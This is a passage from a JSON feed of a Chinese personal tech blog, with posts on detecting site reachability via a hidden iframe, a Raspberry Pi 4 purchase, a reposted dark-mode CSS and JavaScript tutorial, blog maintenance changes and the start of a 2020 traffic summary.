class=\"line\"></span><br></pre></td></tr></table></figure><p>缺点：不是每一个网站都存在 <code>/favicon.ico</code> 文件，但如果加载特定文件的话挺好的。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E6%96%B9%E6%B3%95%E4%BA%8C\" class=\"headerlink\" title=\"方法二\"></a>方法二</h2>\n<p>使用 JavaScript 创建一个 iframe 标签，设置标签的链接为 检测网址。</p>\n<p><code>onerror</code> 事件触发不能加载的事件，<code>onload</code> 事件触发可以加载的事件，并使用 <code>setTimeout</code> 设置超时时间。</p>\n<p>代码：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 新建 iframe 标签</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> iframe = <span class=\"built_in\">document</span>.createElement(<span class=\"string\">\"iframe\"</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设置 iframe 标签的网址</span></span><br><span class=\"line\">iframe.src=<span class=\"string\">\"https://google.com\"</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 设定超时事件，延迟 3000 毫秒</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> timeout = <span class=\"built_in\">setTimeout</span>(<span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 清除 onerror 和 onload 事件</span></span><br><span class=\"line\">    iframe.onerror = iframe.onload = <span class=\"literal\">null</span>;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"time out.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">},<span class=\"number\">3000</span>);</span><br><span class=\"line\"><span class=\"comment\">// 设定错误事件</span></span><br><span class=\"line\">iframe.onerror = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"load error.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行无法加载的事件</span></span><br><span class=\"line\">    canNotLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定可以加载的事件</span></span><br><span class=\"line\">iframe.onload = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">// 先清除超时事件</span></span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeout);</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(<span class=\"string\">\"ok.\"</span>);</span><br><span class=\"line\">    <span class=\"comment\">// 执行可以加载的事件</span></span><br><span class=\"line\">    canLoad();</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canNotLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">canLoad</span>(<span class=\"params\"></span>) </span>{</span><br><span class=\"line\">    <span class=\"comment\">/* code here */</span></span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"comment\">// 设定为不可见</span></span><br><span class=\"line\">iframe.style = <span class=\"string\">\"display: none!important;\"</span>;</span><br><span class=\"line\"><span class=\"comment\">// 向 body 添加 iframe</span></span><br><span class=\"line\"><span class=\"built_in\">document</span>.body.appendChild(iframe);</span><br></pre></td></tr></table></figure><p>缺点：页面上的其他外部链接也会被一并的加载过来，例如 JS 文件，CSS 文件，统计代码。</p>\n<p>您也可以 <a href=\"https://codepen.io/ocoke-the-decoder/pen/dyNZEwq\">点击此链接</a> 前往 CodePen 体验。</p>\n","link":"https://blog.yfun.top/posts/856484826/"},{"title":"树莓派 4 揽件日志","date":"2021-03-19 11:16:00","description":"\n<p>前两天在淘宝上购买了一台 4GB 版本的 树莓派 4 。</p>\n<p>在安装系统时我选择了 <code>Ubuntu Server</code> 系统，因为我并不打算使用图形化界面，而且 Raspbian 系统只有 32 位的 ╮(╯▽╰)╭。</p>\n<p>而商家发的是中通快递，速度慢不说，外包装都给我压烂了。(ó﹏ò｡)</p>\n<p>商家随主板还发货了一个闪迪 32GB TF 卡（读写速度还可以），一个电源，一个外壳还有一个小风扇。</p>\n<p>目前先折腾折腾，玩一玩，后面继续写文章。</p>\n<p>目前没有把网站迁移上去的想法，因为这样的话网站会变得很不稳定。</p>\n","link":"https://blog.yfun.top/posts/229627020/"},{"title":"为网站加入友好的深色模式支持","date":"2021-01-22 04:29:38","description":"\n<div class=\"note note-info\">            <div class=\"title\">转载文章</div>原文标题：你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持<p>原文链接：<a href=\"https://blog.skk.moe/post/hello-darkmode-my-old-friend/\">https://blog.skk.moe/post/hello-darkmode-my-old-friend/</a><br>原文作者：Sukka</p>          </div>\n<p>前几天为我的 Hexo 主题：Miracle 加入了深色模式，但我的技术还是太辣鸡，经常出现问题。</p>\n<p>无意间看到 Sukka 大佬的文章：「你好黑暗，我的老朋友 —— 为网站添加用户友好的深色模式支持」，跟着文章重构了主题深色模式的代码，就转载过来方便学习。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%BB%80%E4%B9%88%E6%98%AF%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"什么是「深色模式」\"></a>什么是「深色模式」</h2>\n<p>很多操作系统在日落后会自动切换到「深色模式」、并不意味着「深色模式」就是「夜间模式」。「夜间模式」用于夜晚的弱光环境，主要目的是保护眼睛、减少强光刺激、避免影响睡眠，不难理解为什么 macOS 的 Night Shift 会自动调节屏幕色温、Android（AOSP）到了夜间可以选择启用系统级「琥珀色」滤镜。</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/macos-settings.png\"><p>「深色模式」更像是一个主题，即使在白天也可以使用。不论是为了在 OLED 屏幕上省电、亦或是减少白光刺激护眼、亦或是暗色模式对色盲用户更加友好，总之 macOS 率先提出了系统级的「暗色模式」、并在 WebKit 中增加了对应的 Media Query，而后 Chromium、Firefox 先后跟进，如今兼容 <code>prefers-color-scheme</code> 的浏览器占有率已经高达 81.82%。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E5%88%A9%E7%94%A8-Media-Query-%E7%AE%80%E5%8D%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"利用 Media Query 简单实现深色模式\"></a>利用 Media Query 简单实现深色模式</h2>\n<p>CSS 媒体查询 <code>@media</code> 是一个足够强大的特性，可以有条件地将样式应用于文档和各种上下文中。<a href=\"https://drafts.csswg.org/mediaqueries-5/\">Media Queries Level 5 草案</a> 中提出了深色模式的判断方式 <code>prefers-color-scheme</code>，包含 <code>light</code>、<code>dark</code>、<code>no-preference</code> 三种值。而不支持 Media Queries 5 的浏览器会直接无视 CSS 中的 <code>prefers-color-scheme</code> Media Query，无需额外的代码即可优雅降级。</p>\n<p>还记得我刚刚说过「深色模式更像一个主题」么？为网站新增深色模式就如同换肤功能；搭配 <code>prefers-color-scheme</code>，编写深色模式的思路就如同编写响应式一般、无需赘述，结合几段 Code Snippet 一笔带过：</p>\n<h3>\n<a href=\"https://blog.yfun.top/#CSS-Variable-%E7%9A%84%E6%96%B9%E6%B3%95%E5%AE%9E%E7%8E%B0%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F\" class=\"headerlink\" title=\"CSS Variable 的方法实现深色模式\"></a>CSS Variable 的方法实现深色模式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-text</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>通过维护两套 CSS Variable，可以快速切换不同的配色方案。这种方法特点是所需代码较少，缺点是 CSS Variable 的兼容性较差，可能还需要引入额外的 Polyfill。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E4%B8%BA%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E5%8D%95%E7%8B%AC%E7%BC%96%E5%86%99%E6%A0%B7%E5%BC%8F\" class=\"headerlink\" title=\"为深色模式单独编写样式\"></a>为深色模式单独编写样式</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">    <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>直接维护两套样式的方法清晰直观、任何网站都可以基于这种方法进行改造。但会造成冗余代码、较难实现统一的风格、后期不易维护。</p>\n<h3>\n<a href=\"https://blog.yfun.top/#%E6%9D%A1%E4%BB%B6%E6%80%A7%E5%8A%A0%E8%BD%BD%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E7%9A%84-CSS-%E6%96%87%E4%BB%B6\" class=\"headerlink\" title=\"条件性加载深色模式的 CSS 文件\"></a>条件性加载深色模式的 CSS 文件</h3>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/* main.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* dark.css */</span></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"number\">#fff</span>;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"main.css\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">link</span> <span class=\"attr\">rel</span>=<span class=\"string\">\"stylesheet\"</span> <span class=\"attr\">href</span>=<span class=\"string\">\"dark.css\"</span> <span class=\"attr\">media</span>=<span class=\"string\">\"(prefers-color-scheme: dark)\"</span>&gt;</span></span><br></pre></td></tr></table></figure><p>利用 <code>&lt;link&gt;</code> 标签的 Media Query，甚至可以单独加载暗色模式的 CSS 文件。</p>\n<blockquote><p>需要注意 CSS 选择器的权重，因此作为可选的 <code>dark.css</code> 一定要放在 <code>main.css</code> 之后加载。</p></blockquote>\n<p>除了上述三种方式以外，使用 CSS <code>filter</code> 或 <code>mix-blend-mode</code> 还可以实现对网站整体色调的改变，可以确保配色风格的统一性。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D%E7%9A%84%E5%85%BC%E5%AE%B9%E6%80%A7\" class=\"headerlink\" title=\"「深色模式」的兼容性\"></a>「深色模式」的兼容性</h2>\n<p>虽然有了优雅的 <code>prefers-color-scheme</code> 可以识别操作系统的显示模式，但是对于用户来说，仅依赖 Media Query 的「深色模式」并不能带来很好的体验。<br>首先是浏览器兼容性。虽然支持该特性的浏览器的市场占有率非常喜人，但是从版本号上来看却并不乐观：</p>\n<img webp-comp src=\"https://cdn.jsdelivr.net/npm/sks@0.0.6/caniuse.png\"><p>考虑到使用 Chormium 70 内核甚至 Tencent X5 内核的国产浏览器，大部分用户并没有机会体验到深色模式。除此以外，操作系统级别的「深色模式」实现也会受到 OEM 厂商的影响 —— 虽然 Android 10（AOSP）提供「深色模式」，但是一加的 OxygenOS 却将其深藏在系统主题设置里，没有自动切换、在 Quick Settings 里也没有快速的切换开关。</p>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AE%BE%E8%AE%A1%E4%B8%80%E4%B8%AA%E7%94%A8%E6%88%B7%E5%8F%8B%E5%A5%BD%E7%9A%84%E3%80%8C%E6%B7%B1%E8%89%B2%E6%A8%A1%E5%BC%8F%E3%80%8D\" class=\"headerlink\" title=\"设计一个用户友好的「深色模式」\"></a>设计一个用户友好的「深色模式」</h2>\n<p>受限于兼容性和复杂的操作系统，大部分网站依然在使用更传统的「开关」切换 —— 通过 toggle <code>&lt;html&gt;</code> 或<br><code>&lt;body&gt;</code> 的 class 属性实现在两套样式之间切换、并将开关的状态记忆在 localStorage 中的方法虽然有效，却是无奈之举，手动切换开关相比 <code>prefers-color-scheme</code> 也不够优雅。如果将「开关」和 <code>prefers-color-scheme</code> 结合起来，就可以带来更好的用户体验：</p>\n<ul>\n<li>对于不兼容的浏览器或操作系统，访客依然可以通过开关手动切换显示模式</li>\n<li>对于兼容的浏览器或操作系统，Media Query 能够实现在两种显示模式之间切换</li>\n<li>在兼容的浏览器或操作系统上，用户还可以通过开关 override 当前的显示模式</li>\n</ul>\n<p>在将两者组合在一起时，不能简单地用「开关」覆盖 <code>prefers-color-scheme</code>，否则用户触发开关、状态被永久记忆在 localStorage 之后，就变成了僵硬的手动模式。<br>举个例子。访客可能在操作系统还没有自动切换到「深色模式」时通过网站上的开关切换显示模式，经过一个夜晚后到了次日白天、访客再度访问网站时，自然希望不需要再切换开关、网站就能以常规的浅色模式显示。因此设计思路是当 <code>prefers-color-scheme</code> 的值发生改变（从 与用户需要的显示模式不同 变成 相同）时清空 localStorage 中储存的开关状态，此时显示模式切换回基于 Media Query 的「自动」模式。</p>\n<p><strong>Talk is cheap, here goes the code.</strong></p>\n<p>首先是 CSS：</p>\n<figure class=\"highlight css\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#333</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">@media</span> (<span class=\"attribute\">prefers-color-scheme:</span> dark) {</span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span> {</span><br><span class=\"line\">    <span class=\"attribute\">--color-mode</span>: <span class=\"string\">'dark'</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"selector-pseudo\">:root</span><span class=\"selector-pseudo\">:not(</span><span class=\"selector-attr\">[data-user-color-scheme]</span>) {</span><br><span class=\"line\">    <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-attr\">[data-user-color-scheme=<span class=\"string\">'dark'</span>]</span> {</span><br><span class=\"line\">  <span class=\"attribute\">--text</span>: <span class=\"number\">#eff</span>;</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-tag\">body</span> {</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"built_in\">var</span>(--color-text);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>真是令人看的头大，让我们逐行来看都是些什么：</p>\n<ul>\n<li>在 <code>:root</code> 下定义了一个 CSS Variable <code>--color-mode: light</code> 和在浅色模式下用到的 CSS Variable（比如使用深色 <code>#333</code> 作为主要字体颜色）。</li>\n<li>使用 <code>prefers-color-scheme</code> 的 Media Query 定义深色模式下的 CSS Variable： <code>--color-mode: light</code> 。深色模式的样式（如浅色 <code>#eff</code> 作为主要字体颜色）要定义在 <code>:not([data-user-color-scheme])</code> 伪类下以避免「开关」的行为覆盖浏览器的样式。</li>\n<li>为 <code>[data-user-color-scheme='dark']</code> 再定义一遍深色模式下用到的样式。<br>有了这段 CSS，不难理解深色模式何时会生效：当操作系统使用「深色模式」且 <code>&lt;html&gt;</code> 或 <code>&lt;body&gt;</code> 标签上没有 <code>data-user-color-scheme</code> 属性时、或者存在 <code>data-user-color-scheme</code> 属性且值为 <code>dark</code> 时。</li>\n</ul>\n<p>然后是困难的部分了：编写 JavaScript 为「开关」添加行为。</p>\n<p>先定义一些常量：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> rootElement = <span class=\"built_in\">document</span>.documentElement; <span class=\"comment\">// &lt;html&gt;</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeStorageKey = <span class=\"string\">'user-color-scheme'</span>; <span class=\"comment\">// 作为 localStorage 的 key</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeMediaQueryKey = <span class=\"string\">'--color-mode'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> rootElementDarkModeAttributeName = <span class=\"string\">'data-user-color-scheme'</span>;</span><br><span class=\"line\"><span class=\"keyword\">const</span> darkModeTogglebuttonElement = <span class=\"built_in\">document</span>.getElementById(<span class=\"comment\">/* element id */</span>);</span><br></pre></td></tr></table></figure><p>接下来，用 <code>try {} catch (e) {}</code> 封装一下 localStorage 的操作，以应对 HTML5 Storage 被禁用、localStorage 被写满、localStorage 实现不完整的情况：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> setLS = <span class=\"function\">(<span class=\"params\">k, v</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.setItem(k, v);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> removeLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"built_in\">localStorage</span>.removeItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) { }</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> getLS = <span class=\"function\">(<span class=\"params\">k</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">try</span> {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">localStorage</span>.getItem(k);</span><br><span class=\"line\">  } <span class=\"keyword\">catch</span> (e) {</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">null</span> <span class=\"comment\">// 与 localStorage 中没有找到对应 key 的行为一致</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>我们还需要一个函数读取当前 <code>prefers-color-scheme</code> 的方法。由于已经在 CSS 中定义了 <code>--color-mode</code>，所以在 JS 中直接读取就好了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> getModeFromCSSMediaQuery = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">const</span> res = getComputedStyle(rootElement).getPropertyValue(darkModeMediaQueryKey);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (res.length) <span class=\"keyword\">return</span> res.replace(<span class=\"regexp\">/\\\"/g</span>, <span class=\"string\">''</span>).trim();</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res === <span class=\"string\">'dark'</span> ? <span class=\"string\">'dark'</span> : <span class=\"string\">'light'</span>;</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"comment\">// 使用 matchMedia API 的写法会优雅的多</span></span><br><span class=\"line\">  <span class=\"comment\">// return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'</span></span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>还记得我们需要自动取消手动模式回到 <code>prefers-color-scheme</code> 么？意味着我们需要一个函数清掉 LS、删掉 <code>&lt;html&gt;</code> 存在的 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> resetRootDarkModeAttributeAndLS = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  rootElement.removeAttribute(rootElementDarkModeAttributeName);</span><br><span class=\"line\">  removeLS(darkModeStorageKey);</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>接下来是起主要作用的函数了，负责为 <code>&lt;html&gt;</code> 标签修改 <code>data-user-color-scheme</code> 属性：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> validColorModeKeys = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"literal\">true</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> applyCustomDarkModeSettings = <span class=\"function\">(<span class=\"params\">mode</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 接受从「开关」处传来的模式，或者从 localStorage 读取</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> currentSetting = mode || getLS(darkModeStorageKey);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (currentSetting === getModeFromCSSMediaQuery()) {</span><br><span class=\"line\">    <span class=\"comment\">// 当用户自定义的显示模式和 prefers-color-scheme 相同时重置、恢复到自动模式</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) { <span class=\"comment\">// 相比 Array#indexOf，这种写法 Uglify 后字节数更少</span></span><br><span class=\"line\">    rootElement.setAttribute(rootElementDarkModeAttributeName, currentSetting);</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 首次访问或从未使用过开关、localStorage 中没有存储的值，currentSetting 是 null</span></span><br><span class=\"line\">    <span class=\"comment\">// 或者 localStorage 被篡改，currentSetting 不是合法值</span></span><br><span class=\"line\">    resetRootDarkModeAttributeAndLS();</span><br><span class=\"line\">  }</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>当然，「开关」还需要一个函数，这个函数负责获取相反的显示模式，同时还要将新的模式写入 localStorage 存储起来：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> invertDarkModeObj = {</span><br><span class=\"line\">  <span class=\"string\">'dark'</span>: <span class=\"string\">'light'</span>,</span><br><span class=\"line\">  <span class=\"string\">'light'</span>: <span class=\"string\">'dark'</span></span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> toggleCustomDarkMode = <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">let</span> currentSetting = getLS(darkModeStorageKey);</span><br><span class=\"line\">  </span><br><span class=\"line\">  <span class=\"keyword\">if</span> (validColorModeKeys[currentSetting]) {</span><br><span class=\"line\">    <span class=\"comment\">// 从 localStorage 中读取模式，并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[currentSetting];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (currentSetting === <span class=\"literal\">null</span>) {</span><br><span class=\"line\">    <span class=\"comment\">// localStorage 中没有相关值，或者 localStorage 抛了 Error</span></span><br><span class=\"line\">    <span class=\"comment\">// 从 CSS 中读取当前 prefers-color-scheme 并取相反的模式</span></span><br><span class=\"line\">    currentSetting = invertDarkModeObj[getModeFromCSSMediaQuery()];</span><br><span class=\"line\">  } <span class=\"keyword\">else</span> {</span><br><span class=\"line\">    <span class=\"comment\">// 不知道出了什么幺蛾子，比如 localStorage 被篡改成非法值</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span>; <span class=\"comment\">// 直接 return;</span></span><br><span class=\"line\">  }</span><br><span class=\"line\">  <span class=\"comment\">// 将相反的模式写入 localStorage</span></span><br><span class=\"line\">  setLS(darkModeStorageKey, currentSetting);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">return</span> currentSetting;</span><br><span class=\"line\">}</span><br></pre></td></tr></table></figure><p>相关的函数都定义完了，是时候添加函数执行了：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 当页面加载时，将显示模式设置为 localStorage 中自定义的值（如果有的话）</span></span><br><span class=\"line\">applyCustomDarkModeSettings();</span><br><span class=\"line\"></span><br><span class=\"line\">darkModeTogglebuttonElement.addEventListener(<span class=\"string\">'click'</span>, <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">  <span class=\"comment\">// 当用户点击「开关」时，获得新的显示模式、写入 localStorage、并在页面上生效</span></span><br><span class=\"line\">  applyCustomDarkModeSettings(toggleCustomDarkMode());</span><br><span class=\"line\">})</span><br></pre></td></tr></table></figure><p>我的博客也使用的这种实现，通过 Navbar 中的按钮体验一下吧！</p>\n","link":"https://blog.yfun.top/posts/175456095/"},{"title":"博客最近的一些改变","date":"2021-01-13 10:15:49","description":"\n<h2>\n<a href=\"https://blog.yfun.top/#%E4%B8%BB%E9%A2%98\" class=\"headerlink\" title=\"主题\"></a>主题</h2>\n<p>经过近一个月的开发，Miracle 主题已经发布至 <code>v1.2.0</code> 版本，也正式可以开始使用。</p>\n<p>主题仓库：<a href=\"https://t.yfun.top/api/jump?u=https://github.com/hifun-team/hexo-theme-miracle\">hifun-team/hexo-theme-miracle</a></p>\n<p>主题对输出的内容等进行优化，去除不必要的资源，速度非常之快。</p>\n<blockquote><p>PS: 主要原因是主题的首页没有图片，这主要是因为我不想找图，而且会拖慢页面速度，一举两等。[doge]</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E8%AF%84%E8%AE%BA\" class=\"headerlink\" title=\"评论\"></a>评论</h2>\n<p><del>评论更换为 Waline，这样我就有了评论后台、回复通知和关键词过滤，真不错！</del></p>\n<blockquote><p>已更换至 Twikoo</p></blockquote>\n<h2>\n<a href=\"https://blog.yfun.top/#%E9%83%A8%E7%BD%B2\" class=\"headerlink\" title=\"部署\"></a>部署</h2>\n<p><del>部署换回了直接部署 ( <code>hexo d</code> )，因为主题在 <code>Action</code> 部署时一直无法解析 <code>Tag 插件</code>，而本地又可以...</del></p>\n<p><del>而且实际上使用云部署的次数并不多，因为我每次写完文章以后都会自己看一遍，不太必要。</del></p>\n<p>已重新切换回云部署，并且已经解决无法解析 <code>Tag 插件</code> 的问题。</p>\n","link":"https://blog.yfun.top/posts/1987652759/"},{"title":"无垠 2020 年度总结","date":"2020-12-29 21:04:02","description":"\n<p>2020 即将过去，2021 已在眼前。2020 实在是多灾多难的一年，新冠疫情可以说是严重打乱了我的生活计划，希望新的一年，一切都可以变好吧。</p>\n<p>2020 还剩下最后两天，是时候总结一下这一年了。</p>\n<h1>统计数据</h1>\n<p>依然是一些统计数据。以下数据截止 2020 年 12 月 29 日 23:39:59。</p>\n<h2>博客主站</h2>\n<p>无垠博客主站，年 UV 28,888 (<span>+7.4%</span>)，年 PV 76,583 (<span>-1.66%</span>)，日均 UV 79.36，平均停留时间 5分13秒 (<span>-21.4%</span>)，平均跳出率 51% (<span>-3.77%</span>)。一年有效文章数 5 (<span>+150%</span>)，新增评论 242 条 (<span>-44.9%</span>)。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/blog-2020.png\" alt=\"\" width=\"515\" height=\"670\" class=\"aligncenter size-full wp-image-2432\"></a>\n<p>文章数提升，访问量也有所提升，但 PV 和停留时间却下降了，或许我还需要继续提高文章的质量…</p>\n<h2>个人主页</h2>\n<p>个人主页依然是几乎没有更新过。什么时候能把 TODO List 上的东西做了呢？我也不知道。不过访问量倒是比去年上升了不少。</p>\n<p>个人页总 UV 3,515 (<span>+64.2%</span>)，总 PV 3,929 (<span>+43.2%</span>)，日均 UV 9.9 (<span>+65%</span>)，平均停留时间 63秒 (<span>+1.6%</span>)。和去年一样，主要来源是知乎和 V2EX。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/axton-2020.png\"><img loading=\"lazy\" 